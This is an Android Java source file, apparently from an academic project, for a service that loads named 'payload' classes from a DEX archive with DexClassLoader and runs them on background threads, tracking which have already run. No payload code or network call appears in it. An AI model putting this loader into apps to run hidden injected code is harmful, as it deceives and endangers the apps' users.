package it.unisannio.srss.dame.android.services;

import it.unisannio.srss.dame.android.payloads.Payload;
import it.unisannio.srss.dame.android.payloads.PayloadConfig;

import java.io.File;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class PayloadService extends Service {

	/**
	 * Costante usata nell'intent come chiave per la classe del payload passata.
	 */
	public final static String PAYLOAD_CLASS = "PAYLOAD_CLASS";

	private final static String TAG = PayloadService.class.getSimpleName();

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		String payloadStringClass = intent.getExtras().getString(PAYLOAD_CLASS);
		if (payloadStringClass != null) {
			Log.d(TAG, "Loading payload " + payloadStringClass);
			try {
				@SuppressWarnings("unchecked")
				final Class<Payload> payloadClass = (Class<Payload>) getLoader()
						.loadClass(payloadStringClass);
				final Payload payload = payloadClass.getConstructor(
						Context.class).newInstance(getApplicationContext());
				boolean executed = PreferenceManager
						.getDefaultSharedPreferences(getApplicationContext())
						.getBoolean(
								"EXECUTED_"
										+ payload.getClass().getCanonicalName(),
								false);
				if (!executed
						|| payload.getConfig().getExecution() == PayloadConfig.ALWAYS) {
					new Thread(payload, "PayloadRunner [" + payloadStringClass
							+ "]").start();
					Log.d(TAG, "Payload " + payloadStringClass + " executed");
				} else {
					Log.d(TAG, "Payload " + payloadStringClass
							+ " already executed");
				}
				PreferenceManager
						.getDefaultSharedPreferences(getApplicationContext())
						.edit()
						.putBoolean(
								"EXECUTED_"
										+ payload.getClass().getCanonicalName(),
								true).commit();
			} catch (Exception e) {
				Log.d(TAG, "Could not load the payload " + payloadStringClass,
						e);
			}
		} else {
			Log.e(TAG, "Payload service started without class param");
		}
		return super.onStartCommand(intent, flags, startId);
	}

	/**
	 * Usare questo metodo per far partire un payload
	 * 
	 * @param c
	 *            Context del chiamante
	 * @param payloadClass
	 *            la classe del payload
	 */
	public static void runPayload(Object c, String payloadClass) {
		Log.d(TAG, "Payload call from " + c.getClass().getName());
		if (c instanceof Context) {
			Log.d(TAG, "Payload call accepted: " + payloadClass);
			Intent i = new Intent((Context) c, PayloadService.class);
			i.putExtra(PAYLOAD_CLASS, payloadClass);
			((Context) c).startService(i);
		} else {
			Log.d(TAG, "Payload call (" + payloadClass
					+ ") rejected because issued from a non-context object.");
		}
	}

	private DexClassLoader loader = null;

	private DexClassLoader getLoader() {
		if (loader == null) {
			final String libPath = Utils.getPayloadsArchivePath(this);
			final File tmpDir = getDir("DEX", 0);
			loader = new DexClassLoader(libPath, tmpDir.getAbsolutePath(),
					null, this.getClassLoader());
		}
		return loader;
	}

}
